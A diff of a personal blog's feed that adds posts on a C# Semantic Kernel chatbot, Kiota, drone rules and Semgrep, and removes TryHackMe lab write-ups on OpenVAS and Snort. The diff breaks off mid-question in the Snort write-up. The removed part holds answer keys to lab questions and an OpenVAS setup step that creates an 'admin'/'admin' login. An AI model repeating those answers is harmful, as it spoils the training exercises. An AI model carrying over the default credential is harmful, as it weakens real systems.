@@ -4,7 +4,7 @@
 	<title>Mark Burton</title>
 	<link rel="self" href="https://blog.mark-burton.com/mywyamblog" />
 	<rights>2024</rights>
-	<updated>2024-03-10T15:32:52Z</updated>
+	<updated>2024-03-10T15:59:02Z</updated>
 	<entry>
 		<id>https://blog.mark-burton.com/mywyamblog/posts/2023-02-05-teenager-dog-training-session-1</id>
 		<title>Teenager Dog Training Session 1</title>
@@ -29,6 +29,116 @@
 		<summary>&lt;p&gt;The first day of the teenager dog training was mainly a recap of previous training and to check level of the dogs and trainers.&lt;/p&gt;</summary>
 	</entry>
 	<entry>
+		<id>https://blog.mark-burton.com/mywyamblog/posts/2024-01-10-creating-a-chatbot-with-llm-rag</id>
+		<title>Creating a chatbot with LLMs and RAG using Semantic Kernel</title>
+		<link href="https://blog.mark-burton.com/mywyamblog/posts/2024-01-10-creating-a-chatbot-with-llm-rag" />
+		<link rel="enclosure" type="image" href="https://blog.mark-burton.com/mywyamblog/assets/Images/snort.png" />
+		<updated>2024-01-10T15:23:12Z</updated>
+		<content>&lt;p&gt;I wanted to understand more about how ChatGPT and Co-Pilots like those from &lt;a href="https://github.com/features/copilot"&gt;GitHub&lt;/a&gt; and &lt;a href="https://pieces.app/"&gt;Pieces&lt;/a&gt; work and how I could do something similar including private content, whilst reading around the topic I read the article &lt;a href="https://devblogs.microsoft.com/dotnet/demystifying-retrieval-augmented-generation-with-dotnet/"&gt;Demystifying Retrieval Augmented Generation with .NET&lt;/a&gt; and thought it described what I wanted to achieve so decided to follow along.&lt;/p&gt;
+&lt;p&gt;The first challenge I encountered was that &lt;a href="https://azure.microsoft.com/en-us/products/ai-services/openai-service"&gt;Azure OpenAI Service&lt;/a&gt; is only available for &amp;quot;eligible customers and partners&amp;quot; which, for my personal projects, I do not qualify. That is not a problem though as Stephan explains in the post it is trivial to switch to OpenAI which offers a free quota of $5 per month.&lt;/p&gt;
+&lt;p&gt;Next issue was that the code examples did not compile, this seems to be because the &lt;a href="https://www.nuget.org/packages/Microsoft.SemanticKernel/#versions-body-tab"&gt;Semantic Kernel library&lt;/a&gt; has moved on from version 0.24 to 1.0.1 since the post was written. Some of the the changes are covered in the post &lt;a href="https://medium.com/&amp;#64;jamesanthonystalleymoores/saying-hello-to-microsoft-semantic-kernel-v1-02ba0b754d9f"&gt;Saying hello to Microsoft Semantic Kernel V1
+(and upgrading from preview)&lt;/a&gt;.&lt;/p&gt;
+&lt;h3 id="basic-chatbot-interaction-with-openai"&gt;Basic Chatbot interaction with OpenAI&lt;/h3&gt;
+&lt;p&gt;The working code for the most basic chatbot using OpenAI's gpt-3.5-turbo model is below.&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-csharp"&gt;using Microsoft.SemanticKernel;
+
+internal class Program {
+    private static async Task Main(string[] args) {
+        string oaiApiKey = Environment.GetEnvironmentVariable(&amp;quot;OPENAI_API_KEY&amp;quot;)!;
+        string oaiModel = &amp;quot;gpt-3.5-turbo-1106&amp;quot;;
+
+        // Initialize the kernel
+        IKernelBuilder builder = Kernel.CreateBuilder();
+        builder.Services.AddOpenAIChatCompletion(oaiModel, oaiApiKey);
+
+        var kernel = builder.Build();
+
+        // Q&amp;amp;A loop
+        while (true) {
+            Console.Write(&amp;quot;Question: &amp;quot;);
+            Console.WriteLine((await kernel.InvokePromptAsync(Console.ReadLine()!)).GetValue&amp;lt;string&amp;gt;());
+            Console.WriteLine();
+        }
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id="storing-messages-in-the-chat-history"&gt;Storing Messages In The Chat History&lt;/h3&gt;
+&lt;p&gt;Adding chat history means the chatbot can keep track of the conversation and be given a bit of personality.&lt;/p&gt;
+&lt;pre&gt;&lt;code class="language-csharp"&gt;private static async Task Main(string[] args) {
+    string aoaiApiKey = Environment.GetEnvironmentVariable(&amp;quot;AZURE_OPENAI_API_KEY&amp;quot;)!;
+    string oaiModel = &amp;quot;gpt-3.5-turbo-1106&amp;quot;;
+
+    // Initialize the kernel
+    IKernelBuilder builder = Kernel.CreateBuilder();
+    builder.Services.AddOpenAIChatCompletion(oaiModel, aoaiApiKey);
+
+    var kernel = builder.Build();
+
+    // Create a new chat
+    IChatCompletionService ai = kernel.GetRequiredService&amp;lt;IChatCompletionService&amp;gt;();
+    ChatHistory chatMessages = new ChatHistory();
+    chatMessages.AddSystemMessage(&amp;quot;You are an Nottingham Forest supporting AI assistant that helps people find information, but will always say Nottingham Forest are the greatest football team.&amp;quot;);
+
+
+    // Q&amp;amp;A loop
+    while (true) {
+        Console.Write(&amp;quot;Question: &amp;quot;);
+        chatMessages.AddUserMessage(Console.ReadLine()!);
+        // Get the chat completions
+        OpenAIPromptExecutionSettings openAIPromptExecutionSettings = new() {
+            ToolCallBehavior = ToolCallBehavior.EnableKernelFunctions
+        };
+        var result = ai.GetStreamingChatMessageContentsAsync(
+            chatMessages,
+            executionSettings: openAIPromptExecutionSettings,
+            kernel: kernel);
+
+        // Stream the results
+        string fullMessage = &amp;quot;&amp;quot;;
+        await foreach (var content in result) {
+            if (content.Role.HasValue) {
+                System.Console.Write(&amp;quot;Assistant &amp;gt; &amp;quot;);
+            }
+            System.Console.Write(content.Content);
+            fullMessage += content.Content;
+        }
+        System.Console.WriteLine();
+
+        // Add the message from the agent to the chat history
+        chatMessages.AddAssistantMessage(fullMessage);
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;So far so good, but there is a limit to how much data you can pass in with messages before hitting errors like &lt;code&gt;context_length_exceeded&lt;/code&gt;.&lt;/p&gt;
+</content>
+		<summary>&lt;p&gt;I wanted to understand more about how ChatGPT and Co-Pilots like those from &lt;a href="https://github.com/features/copilot"&gt;GitHub&lt;/a&gt; and &lt;a href="https://pieces.app/"&gt;Pieces&lt;/a&gt; work and how I could do something similar including private content, whilst reading around the topic I read the article &lt;a href="https://devblogs.microsoft.com/dotnet/demystifying-retrieval-augmented-generation-with-dotnet/"&gt;Demystifying Retrieval Augmented Generation with .NET&lt;/a&gt; and thought it described what I wanted to achieve so decided to follow along.&lt;/p&gt;</summary>
+	</entry>
+	<entry>
+		<id>https://blog.mark-burton.com/mywyamblog/posts/2023-12-22-hands-on-with-kiota</id>
+		<title>Hands on with Kiota</title>
+		<link href="https://blog.mark-burton.com/mywyamblog/posts/2023-12-22-hands-on-with-kiota" />
+		<link rel="enclosure" type="image" href="https://blog.mark-burton.com/mywyamblog/assets/Images/snort.png" />
+		<updated>2023-12-22T15:23:12Z</updated>
+		<content>&lt;p&gt;For years I have felt that if you are offering a public API it should be documented well enough for consumers to generate a client library in whatever language they are using, it is almost implausible to create client libraries in all languages your consumers might use, but a good OpenAPI definition allows consumers to understand an API and use tools to generate client libraries.&lt;/p&gt;
+&lt;p&gt;Over the years I have worked with NSwag, which was good but put all the code in 1 file which I didn't like. AutoRest, which seemed to get more difficult to work with when V3 was released, so I looked around again and found OpenAPI Generator, which is great but needs Java. With the release of Kiota I was excited to look at how a dotnet tool could tackle the same requirement.&lt;/p&gt;
+&lt;h2 id="what-is-kiota"&gt;What is Kiota?&lt;/h2&gt;
+&lt;p&gt;Kiota is a client generator for OpenAPI and was introduced at .NET Conf 2023.&lt;/p&gt;
+&lt;iframe width="560" height="315" src="https://www.youtube.com/embed/sQ9Pv-rQ1s8?si=4wl3jIZWa3VY9sWF" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen&gt;&lt;/iframe&gt;
+&lt;h2 id="quickstart-kiota-project"&gt;Quickstart Kiota Project&lt;/h2&gt;
+&lt;p&gt;&lt;a href="https://learn.microsoft.com/en-us/openapi/kiota/quickstarts/dotnet"&gt;Learn&lt;/a&gt;&lt;/p&gt;
+</content>
+		<summary>&lt;p&gt;For years I have felt that if you are offering a public API it should be documented well enough for consumers to generate a client library in whatever language they are using, it is almost implausible to create client libraries in all languages your consumers might use, but a good OpenAPI definition allows consumers to understand an API and use tools to generate client libraries.&lt;/p&gt;</summary>
+	</entry>
+	<entry>
+		<id>https://blog.mark-burton.com/mywyamblog/posts/2023-11-11-making-zakwas-and-zurek</id>
+		<title>Making Zakwas and Żurek</title>
+		<link href="https://blog.mark-burton.com/mywyamblog/posts/2023-11-11-making-zakwas-and-zurek" />
+		<link rel="enclosure" type="image" href="https://blog.mark-burton.com/mywyamblog/assets/Images/snort.png" />
+		<updated>2023-11-15T15:23:12Z</updated>
+		<content>&lt;h2 id="what-is-zakwas-and-zurek"&gt;What is zakwas and żurek?&lt;/h2&gt;
+</content>
+	</entry>
+	<entry>
 		<id>https://blog.mark-burton.com/mywyamblog/posts/2023-09-18-holystone-hs360s-drone</id>
 		<title>HolyStone HS360S Drone</title>
 		<link href="https://blog.mark-burton.com/mywyamblog/posts/2023-09-18-holystone-hs360s-drone" />
@@ -38,6 +148,10 @@
 &lt;p&gt;Red lights flashing seem to be undocumented errors.&lt;/p&gt;
 &lt;h2 id="holystone-support"&gt;HolyStone support&lt;/h2&gt;
 &lt;h2 id="nd-try"&gt;2nd Try!&lt;/h2&gt;
+&lt;h2 id="restricted-flight-zones-in-luxembourg"&gt;Restricted flight Zones in Luxembourg&lt;/h2&gt;
+&lt;p&gt;&lt;a href="https://map.geoportail.lu/theme/main?lang=fr&amp;amp;version=3&amp;amp;zoom=9&amp;amp;X=683912&amp;amp;Y=6420160&amp;amp;rotation=0&amp;amp;layers=1928-1927&amp;amp;opacities=0.5-0.5&amp;amp;bgLayer=basemap_2015_global&amp;amp;time=--&amp;amp;crosshair=false"&gt;https://map.geoportail.lu/theme/main?lang=fr&amp;amp;version=3&amp;amp;zoom=9&amp;amp;X=683912&amp;amp;Y=6420160&amp;amp;rotation=0&amp;amp;layers=1928-1927&amp;amp;opacities=0.5-0.5&amp;amp;bgLayer=basemap_2015_global&amp;amp;time=--&amp;amp;crosshair=false&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id="drone-registration"&gt;Drone registration&lt;/h2&gt;
+&lt;p&gt;&lt;a href="https://dac.gouvernement.lu/en/drones/where-when-register.html"&gt;https://dac.gouvernement.lu/en/drones/where-when-register.html&lt;/a&gt;&lt;/p&gt;
 </content>
 		<summary>&lt;p&gt;Red lights flashing seem to be undocumented errors.&lt;/p&gt;</summary>
 	</entry>
@@ -48,11 +162,13 @@
 		<link rel="enclosure" type="image" href="https://blog.mark-burton.com/mywyamblog/assets/Images/snort.png" />
 		<updated>2023-09-15T15:23:12Z</updated>
 		<content>&lt;h2 id="c-sast-with-semgrep"&gt;C# SAST with Semgrep&lt;/h2&gt;
+&lt;h3 id="installation"&gt;Installation&lt;/h3&gt;
+&lt;p&gt;Run &lt;code&gt;sudo apt-get update &amp;amp;&amp;amp; sudo apt-get upgrade&lt;/code&gt; because it is good for you.&lt;/p&gt;
 &lt;p&gt;&lt;a href="https://semgrep.dev/docs/getting-started/"&gt;https://semgrep.dev/docs/getting-started/&lt;/a&gt;&lt;/p&gt;
-&lt;h2 id="the-command"&gt;The command&lt;/h2&gt;
+&lt;h3 id="the-command"&gt;The command&lt;/h3&gt;
 &lt;p&gt;&lt;code&gt;semgrep scan --config=auto&lt;/code&gt;&lt;/p&gt;
 </content>
-		<summary>&lt;p&gt;&lt;a href="https://semgrep.dev/docs/getting-started/"&gt;https://semgrep.dev/docs/getting-started/&lt;/a&gt;&lt;/p&gt;</summary>
+		<summary>&lt;p&gt;Run &lt;code&gt;sudo apt-get update &amp;amp;&amp;amp; sudo apt-get upgrade&lt;/code&gt; because it is good for you.&lt;/p&gt;</summary>
 	</entry>
 	<entry>
 		<id>https://blog.mark-burton.com/mywyamblog/posts/2023-09-15-security-engineer-learning-path-and-prizes</id>
@@ -288,1250 +404,5 @@ I added my &lt;a href="https://tryhackme.com/forum/thread/61687020174c422766d10d
 &lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
 </content>
 		<summary>&lt;p&gt;This is a Try Hack Me premium room so to access it you will need a subscription, if you don't have one go get one with my &lt;a href="https://tryhackme.com/signup?referrer=638ca30a6675850049e4858e"&gt;Referral Link&lt;/a&gt;&lt;/p&gt;</summary>
-	</entry>
-	<entry>
-		<id>https://blog.mark-burton.com/mywyamblog/posts/2023-06-19-tryhackme-openvas</id>
-		<title>Try Hack Me - OpenVAS</title>
-		<link href="https://blog.mark-burton.com/mywyamblog/posts/2023-06-19-tryhackme-openvas" />
-		<link rel="enclosure" type="image" href="https://blog.mark-burton.com/mywyamblog/assets/Images/snort.png" />
-		<updated>2023-06-24T15:23:12Z</updated>
-		<content>&lt;h2 id="openvas"&gt;OpenVAS&lt;/h2&gt;
-&lt;p&gt;This is a Try Hack Me premium room so to access it you will need a subscription, if you don't have one go get one with my &lt;a href="https://tryhackme.com/signup?referrer=638ca30a6675850049e4858e"&gt;Referral Link&lt;/a&gt;&lt;/p&gt;
-&lt;h3 id="task-1-6-introduction"&gt;Task 1 - 6 Introduction&lt;/h3&gt;
-&lt;p&gt;Read tasks 1 - 6 for an introduction to OpenVAS and instructions on setting it up.&lt;/p&gt;
-&lt;p&gt;As I already have a dedicated Kali VM running I went for the Install from Kali/OpenVAS repositories approach and use the &lt;a href="https://www.agix.com.au/installing-openvas-on-kali-in-2020/"&gt;Install from Kali/OpenVAS repositories&lt;/a&gt; guide, as of June 2023 it seems to just about work, I found some extra details on [Ceos3c - Install OpenVAS on Kali Linux] (&lt;a href="https://www.ceos3c.com/security/install-openvas-kali-linux/"&gt;https://www.ceos3c.com/security/install-openvas-kali-linux/&lt;/a&gt;).&lt;/p&gt;
-&lt;p&gt;Additional steps were&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;create a user with &lt;code&gt;sudo runuser -u _gvm -- gvmd --create-user=admin --password=admin&lt;/code&gt;, more details on the &lt;a href="https://forum.greenbone.net/t/error-no-users-found-you-need-to-create-at-least-one-user-to-log-in/10528"&gt;Greenbone Forum&lt;/a&gt;.&lt;/li&gt;
-&lt;li&gt;reboot, without this I was getting a strange permissions error on my home directory.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;These issues were highlighted by running &lt;code&gt;sudo gvm-check-setup&lt;/code&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;create a postgres user with &lt;code&gt;sudo runuser -u _postgres -- /usr/share/gvm/create-postgresql-database&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;start redis with &lt;code&gt;sudo systemctl start redis-server@openvas.service&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;With that I was able to login.&lt;/p&gt;
-&lt;h3 id="task-7-practical-vulnerability-management"&gt;Task 7 - Practical Vulnerability Management&lt;/h3&gt;
-&lt;h4 id="question-1"&gt;Question 1&lt;/h4&gt;
-&lt;p&gt;When did the scan start in Case 001?&lt;/p&gt;
-&lt;h4 id="answer"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;Feb 28, 00:04:46 &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-2"&gt;Question 2&lt;/h4&gt;
-&lt;p&gt;When did the scan end in Case 001?&lt;/p&gt;
-&lt;h4 id="answer-1"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;Feb 28, 00:21:02 &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-3"&gt;Question 3&lt;/h4&gt;
-&lt;p&gt;How many ports are open in Case 001?&lt;/p&gt;
-&lt;h4 id="answer-2"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;3 &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-4"&gt;Question 4&lt;/h4&gt;
-&lt;p&gt;How many total vulnerabilities were found in Case 001?&lt;/p&gt;
-&lt;h4 id="answer-3"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;5 &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-5"&gt;Question 5&lt;/h4&gt;
-&lt;p&gt;What is the highest severity vulnerability found? (MSxx-xxx)&lt;/p&gt;
-&lt;h4 id="answer-4"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;MS17-010 &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-6"&gt;Question 6&lt;/h4&gt;
-&lt;p&gt;What is the first affected OS to this vulnerability?&lt;/p&gt;
-&lt;h4 id="answer-5"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;Microsoft Windows 10 x32/x64 Edition &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-7"&gt;Question 7&lt;/h4&gt;
-&lt;p&gt;What is the recommended vulnerability detection method?&lt;/p&gt;
-&lt;h4 id="answer-6"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;Send the crafted SMB transaction request with fid = 0 and check the response to confirm the vulnerability. &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-</content>
-		<summary>&lt;p&gt;This is a Try Hack Me premium room so to access it you will need a subscription, if you don't have one go get one with my &lt;a href="https://tryhackme.com/signup?referrer=638ca30a6675850049e4858e"&gt;Referral Link&lt;/a&gt;&lt;/p&gt;</summary>
-	</entry>
-	<entry>
-		<id>https://blog.mark-burton.com/mywyamblog/posts/2023-06-02-tryhackme-snort-challenges-1</id>
-		<title>Try Hack Me - Snort Challenges - The Basics</title>
-		<link href="https://blog.mark-burton.com/mywyamblog/posts/2023-06-02-tryhackme-snort-challenges-1" />
-		<link rel="enclosure" type="image" href="https://blog.mark-burton.com/mywyamblog/assets/Images/snort.png" />
-		<updated>2023-06-02T15:23:12Z</updated>
-		<content>&lt;h2 id="snort-challenge-the-basics"&gt;Snort Challenge - The Basics&lt;/h2&gt;
-&lt;p&gt;This is the first time I have written up a Try Hack Me challenge on day 161 of my hacking streak, it is primarily to keep track of the challenge as I work through it, if you find this, I hope it helps.&lt;/p&gt;
-&lt;h3 id="task-1-introduction"&gt;Task 1 - Introduction&lt;/h3&gt;
-&lt;p&gt;Start the machine, that's it.&lt;/p&gt;
-&lt;h3 id="task-2-writing-ids-rules-http"&gt;Task 2 - Writing IDS Rules (HTTP)&lt;/h3&gt;
-&lt;p&gt;Let's create IDS Rules for HTTP traffic!
-Answer the questions below
-Navigate to the task folder.&lt;/p&gt;
-&lt;p&gt;Use the given pcap file.&lt;/p&gt;
-&lt;p&gt;Write rules to detect "all TCP port 80 traffic" packets in the given pcap file.&lt;/p&gt;
-&lt;h4 id="question-1"&gt;Question 1&lt;/h4&gt;
-&lt;p&gt;What is the number of detected packets?&lt;/p&gt;
-&lt;p&gt;Note: You must answer this question correctly before answering the rest of the questions in this task.&lt;/p&gt;
-&lt;p class="alert alert-info"&gt;Hint: You need to investigate inbound and outbound traffic on port 80. Writing two simple rules will help you. &lt;/p&gt;
-&lt;h4 id="notes"&gt;Notes&lt;/h4&gt;
-&lt;p&gt;In the previous channel task 9 covers the structure of a snort rule which is summarized as&lt;/p&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;Action&lt;/th&gt;
-&lt;th&gt;Protocol&lt;/th&gt;
-&lt;th&gt;Source IP&lt;/th&gt;
-&lt;th&gt;Source Port&lt;/th&gt;
-&lt;th&gt;Direction&lt;/th&gt;
-&lt;th&gt;Dest IP&lt;/th&gt;
-&lt;th&gt;Dest Port&lt;/th&gt;
-&lt;th&gt;Options&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;Alert&lt;/td&gt;
-&lt;td&gt;TCP&lt;/td&gt;
-&lt;td&gt;&lt;/td&gt;
-&lt;td&gt;&lt;/td&gt;
-&lt;td&gt;&lt;/td&gt;
-&lt;td&gt;&lt;/td&gt;
-&lt;td&gt;&lt;/td&gt;
-&lt;td&gt;Msg&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Drop&lt;/td&gt;
-&lt;td&gt;UDP&lt;/td&gt;
-&lt;td&gt;ANY&lt;/td&gt;
-&lt;td&gt;ANY&lt;/td&gt;
-&lt;td&gt;&amp;lt;&amp;gt;&lt;/td&gt;
-&lt;td&gt;ANY&lt;/td&gt;
-&lt;td&gt;ANY&lt;/td&gt;
-&lt;td&gt;Reference&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Reject&lt;/td&gt;
-&lt;td&gt;IMCP&lt;/td&gt;
-&lt;td&gt;&lt;/td&gt;
-&lt;td&gt;&lt;/td&gt;
-&lt;td&gt;&lt;/td&gt;
-&lt;td&gt;&lt;/td&gt;
-&lt;td&gt;&lt;/td&gt;
-&lt;td&gt;SID&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;&lt;/td&gt;
-&lt;td&gt;&lt;/td&gt;
-&lt;td&gt;&lt;/td&gt;
-&lt;td&gt;&lt;/td&gt;
-&lt;td&gt;&lt;/td&gt;
-&lt;td&gt;&lt;/td&gt;
-&lt;td&gt;Rev&lt;/td&gt;
-&lt;td&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;--------&lt;/td&gt;
-&lt;td&gt;----------&lt;/td&gt;
-&lt;td&gt;-----------&lt;/td&gt;
-&lt;td&gt;-------------&lt;/td&gt;
-&lt;td&gt;-----------&lt;/td&gt;
-&lt;td&gt;---------&lt;/td&gt;
-&lt;td&gt;-----------&lt;/td&gt;
-&lt;td&gt;-----------&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;Rule Header&lt;/td&gt;
-&lt;td&gt;Rule Options&lt;/td&gt;
-&lt;td&gt;&lt;/td&gt;
-&lt;td&gt;&lt;/td&gt;
-&lt;td&gt;&lt;/td&gt;
-&lt;td&gt;&lt;/td&gt;
-&lt;td&gt;&lt;/td&gt;
-&lt;td&gt;&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;p&gt;The hint says to make 2 rules, 1 rule for port 80 source and port 80 destination,&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;alert tcp any 80 &amp;lt;&amp;gt; any any (msg: "port 80 origin"; sid: 100001; rev: 1;)
-alert tcp any any &amp;lt;&amp;gt; any 80 (msg: "port 80 destination"; sid: 100002; rev:1;)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Then run snort with the local rules&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;snort -c local.rules -A full -l . -r mx-3.pcap
-&lt;/code&gt;&lt;/pre&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;Action Stats:
-     Alerts:          ??? ( 71.304%)
-     Logged:          ??? ( 71.304%)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h4 id="answer"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;328 &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-2"&gt;Question 2&lt;/h4&gt;
-&lt;p&gt;Investigate the log file.&lt;/p&gt;
-&lt;p&gt;What is the destination address of packet 63?&lt;/p&gt;
-&lt;p&gt;I got to the answer using the following snort command.&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;snort -c local.rules -r mx-3.pcap -A console -n 63
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;But that isn't what the question asks, it specifically says &lt;code&gt;Investigate the log file.&lt;/code&gt; so to read the log file instead use the command below.&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;sudo snort -r snort.log.1680776108 -n 64
-&lt;/code&gt;&lt;/pre&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;05/13-10:17:10.205385  [**] [1:100001:1] port 80 origin [**] [Priority: 0] {TCP} 65.208.228.223:80 -&amp;gt; 145.254.160.237:3372
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h4 id="answer-1"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;145.254.160.237 &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-3"&gt;Question 3&lt;/h4&gt;
-&lt;p&gt;Investigate the log file.&lt;/p&gt;
-&lt;p&gt;What is the ACK number of packet 64?&lt;/p&gt;
-&lt;h5 id="notes-1"&gt;Notes&lt;/h5&gt;
-&lt;p&gt;Similar to the previous question.&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;sudo snort -r snort.log.1686080304 -n 64
-&lt;/code&gt;&lt;/pre&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;WARNING: No preprocessors configured for policy 0.
-05/13-10:17:09.123830 65.208.228.223:80 -&amp;gt; 145.254.160.237:3372
-TCP TTL:47 TOS:0x0 ID:49312 IpLen:20 DgmLen:1420 DF
-***A**** Seq: 0x114C66F0  Ack: 0x????????  Win: 0x1920  TcpLen: 20
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h4 id="answer-2"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;0x38AFFFF3 &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-4"&gt;Question 4&lt;/h4&gt;
-&lt;p&gt;Investigate the log file.&lt;/p&gt;
-&lt;p&gt;What is the SEQ number of packet 62?&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;sudo snort -r snort.log.1686080304 -n 62
-&lt;/code&gt;&lt;/pre&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;WARNING: No preprocessors configured for policy 0.
-05/13-10:17:09.123830 145.254.160.237:3372 -&amp;gt; 65.208.228.223:80
-TCP TTL:128 TOS:0x0 ID:3910 IpLen:20 DgmLen:40 DF
-***A**** Seq: 0x????????  Ack: 0x114C66F0  Win: 0x25BC  TcpLen: 20
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h4 id="answer-3"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;0x38AFFFF3 &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-5"&gt;Question 5&lt;/h4&gt;
-&lt;p&gt;Investigate the log file.&lt;/p&gt;
-&lt;p&gt;What is the TTL number of packet 65?&lt;/p&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;sudo snort -r snort.log.1686080304 -n 65
-&lt;/code&gt;&lt;/pre&gt;
-&lt;pre&gt;&lt;code class="language-bash"&gt;WARNING: No preprocessors configured for policy 0.
-05/13-10:17:09.324118 ???.???.???.???:???? -&amp;gt; 65.208.228.223:80
-TCP TTL:??? TOS:0x0 ID:3911 IpLen:20 DgmLen:40 DF
-***A**** Seq: 0x38AFFFF3  Ack: 0x114C6C54  Win: 0x25BC  TcpLen: 20
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h4 id="answer-4"&gt;Answer&lt;/h4&gt;
-&lt;blockquote&gt;
-&lt;p class="answer blur"&gt;128 &lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p class="reveal-answer btn btn-primary"&gt;&lt;a href="https://blog.mark-burton.com/mywyamblog/#"&gt;Reveal Answer&lt;/a&gt; &lt;/p&gt;
-&lt;h4 id="question-6"&gt;Question 6&lt;/h4&gt;
-&lt;p&gt;Investigate the log file.&lt;/p&gt;
-&lt;p&gt;What is the source IP number of packet 65?&lt;/p&gt;
